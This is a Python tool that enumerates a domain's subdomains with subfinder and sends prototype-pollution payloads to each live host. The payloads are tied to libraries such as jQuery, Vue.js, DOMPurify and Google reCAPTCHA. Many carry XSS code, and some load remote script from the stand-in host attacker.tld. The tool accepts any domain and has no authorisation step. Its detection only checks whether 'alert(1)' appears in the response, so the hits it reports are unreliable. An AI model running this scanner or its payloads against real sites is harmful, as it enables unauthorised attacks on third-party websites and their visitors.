import requests
import subprocess
from colorama import Fore
import time
import os

# List of Proto Payloads (same as provided in your request)
proto_payloads = [
    {"name": "Wistia Embedded Video", "payload": "?__proto__[test]=test"},
    {"name": "William Bowling", "payload": "?__proto__.test=test"},
    {"name": "jQuery query-object plugin", "payload": "?__proto__[test]=test"},
    {"name": "CVE-2021-20083", "payload": "#__proto__[test]=test"},
    {"name": "jQuery Sparkle", "payload": "?constructor.prototype.test=test"},
    {"name": "V4Fire Core Library", "payload": "?__proto__[test]={\"json\":\"value\"}"},
    {"name": "backbone-query-parameters", "payload": "?constructor.prototype.test=test"},
    {"name": "jQuery BBQ", "payload": "?__proto__.array=1|2|3"},
    {"name": "jquery-deparam", "payload": "?constructor[prototype][test]=test"},
    {"name": "MooTools More", "payload": "#__proto__[test]=test"},
    {"name": "Swiftype Site Search", "payload": "?__proto__[test]=test"},
    {"name": "Purl (jQuery-URL-Parser)", "payload": "?constructor.prototype.test=test"},
    {"name": "HubSpot Tracking Code", "payload": "?constructor[prototype][test]=test"},
    {"name": "YUI 3 querystring-parse", "payload": "?constructor[prototype][test]=test"},
    {"name": "Mutiny", "payload": "?__proto__.test=test"},
    {"name": "Google reCAPTCHA", "payload": "?__proto__[srcdoc][]=<script>alert(1)</script>"},
    {"name": "Akamai Boomerang", "payload": "?__proto__[url]=//attacker.tld/js.js"},
    {"name": "DOMPurify <= 2.0.12", "payload": "?__proto__[ALLOWED_ATTR][0]=onerror"},
    {"name": "Vue.js", "payload": "?__proto__[v-if]=_c.constructor('alert(1)')()"},
    {"name": "Segment Analytics.js", "payload": "?__proto__[script][1]=<img/src/onerror%3dalert(1)>"},
    {"name": "Knockout.js", "payload": "?__proto__[4]=a':1,[alert(1)]:1,'b"},
    {"name": "Zepto.js", "payload": "?__proto__[onerror]=alert(1)"},
    {"name": "Sprint.js", "payload": "?__proto__[div][intro]=<img%20src%20onerror%3dalert(1)>"},
    {"name": "Vue.js Advanced", "payload": "?__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()"},
    {"name": "Demandbase Tag", "payload": "?__proto__[Config][SiteOptimization][recommendationApiURL]=//attacker.tld/json_cors.php?"},
    {"name": "@analytics/google-tag-manager", "payload": "?__proto__[customScriptSrc]=//attacker.tld/xss.js"},
    {"name": "i18next", "payload": "?__proto__[nsSeparator]=<img/src/onerror%3dalert(1)>"}
]

# Function to run subfinder and get subdomains
def get_subdomains(domain):
    subdomains = []
    try:
        subprocess.run(["rm", "-f", "subdomains.txt"])  # Clear previous results
        result = subprocess.run(["subfinder", "-d", domain, "-o", "subdomains.txt"], capture_output=True, text=True)
        with open("subdomains.txt", "r") as file:
            subdomains = [line.strip() for line in file.readlines()]
        print(Fore.GREEN + "[+] Subdomains discovered for {}:".format(domain))
        print(Fore.GREEN + "\n".join(subdomains))
    except Exception as e:
        print(Fore.RED + "Error running subfinder: " + str(e))
    return subdomains

# Function to check if the subdomain is live
def check_live_subdomain(subdomain):
    try:
        url = f"http://{subdomain}"
        response = requests.get(url, timeout=5)
        return response.status_code == 200
    except requests.RequestException:
        return False

# Function to test payloads on a subdomain
def test_payloads(subdomain, payloads):
    vulnerable_urls = []
    for payload in payloads:
        try:
            url = f"http://{subdomain}{payload['payload']}"
            response = requests.get(url, timeout=5)
            if response.status_code == 200 and "alert(1)" in response.text:
                print(Fore.RED + f"[!] Vulnerability found on {subdomain} with payload {payload['name']}")
                vulnerable_urls.append(url)
            else:
                print(Fore.YELLOW + f"[+] No vulnerability found on {subdomain} with payload {payload['name']}")
        except requests.RequestException as e:
            print(Fore.YELLOW + f"[+] Error testing {subdomain} with payload {payload['name']}: {e}")
    return vulnerable_urls

# Main function
def main():
    domain = input("Enter the domain to scan for subdomains: ").strip()
    subdomains = get_subdomains(domain)
    live_subdomains = [sub for sub in subdomains if check_live_subdomain(sub)]
    print(Fore.GREEN + f"[+] Live subdomains for {domain}: {live_subdomains}")

    # Store vulnerable URLs
    all_vulnerable_urls = []
    for subdomain in live_subdomains:
        print(Fore.GREEN + f"[+] Testing payloads on {subdomain}")
        vulnerable_urls = test_payloads(subdomain, proto_payloads)
        all_vulnerable_urls.extend(vulnerable_urls)

    # Save vulnerable URLs to file if user opts
    if all_vulnerable_urls:
        save = input("Do you want to save the vulnerable URLs to a file? (y/n): ").strip().lower()
        if save == 'y':
            file_path = input("Enter the file path to save the vulnerable URLs: ").strip()
            if not file_path:
                file_path = "vulnerable_urls.txt"  # default file name
            with open(file_path, "w") as file:
                file.write("\n".join(all_vulnerable_urls))
            print(Fore.GREEN + f"[+] Vulnerable URLs saved to {file_path}")
        else:
            print(Fore.GREEN + "[+] Vulnerable URLs not saved.")
    else:
        print(Fore.GREEN + "[+] No vulnerabilities found.")

if __name__ == "__main__":
    main()
